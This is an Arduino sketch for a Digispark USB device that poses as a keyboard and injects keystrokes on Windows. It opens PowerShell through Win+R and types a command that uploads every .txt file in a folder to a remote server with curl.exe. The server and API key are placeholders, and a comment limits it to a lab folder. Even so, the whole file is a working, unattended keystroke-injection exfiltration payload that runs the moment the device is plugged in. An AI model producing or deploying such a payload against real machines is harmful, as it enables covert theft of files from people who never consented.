#include <DigiKeyboard.h>

// Raw USB HID keycodes
#define HID_R        0x15
#define HID_ENTER    0x28

#define MOD_LGUI     0x08

bool executed = false;

void setup() {
}

void loop() {
  DigiKeyboard.update();

  if (!executed) {

    // Wait for Windows to enumerate the HID keyboard
    DigiKeyboard.delay(3500);

    // Win + R
    DigiKeyboard.sendKeyStroke(HID_R, MOD_LGUI);
    DigiKeyboard.delay(800);

    // Open PowerShell
    DigiKeyboard.print(F("powershell.exe"));
    DigiKeyboard.sendKeyStroke(HID_ENTER);

    DigiKeyboard.delay(1800);

    // Server + API key
    DigiKeyboard.print(F(
      "$s='YOUR_UPLOAD_SERVER_API';"
    ));

    DigiKeyboard.print(F(
      "$k='YOUR_UPLOAD_API_KEY';"
    ));

    // Explicit test folder only
    DigiKeyboard.print(F(
      "$d='C:\\DigisparkLab\\outbox';"
    ));

    // Upload every .txt file in the lab folder
    DigiKeyboard.print(F(
      "Get-ChildItem -Path $d -File -Filter '*.txt'|ForEach-Object{"
    ));

    DigiKeyboard.print(F(
      "curl.exe --silent --show-error --fail "
      "-X POST "
      "-H \"X-API-Key: $k\" "
      "-F \"file=@$($_.FullName)\" "
      "$s;"
    ));

    DigiKeyboard.print(F(
      "Write-Host \"Uploaded: $($_.Name)\""
      "}"
    ));

    // Execute PowerShell script
    DigiKeyboard.sendKeyStroke(HID_ENTER);

    DigiKeyboard.delay(8000);

    executed = true;
  }

  DigiKeyboard.delay(100);
}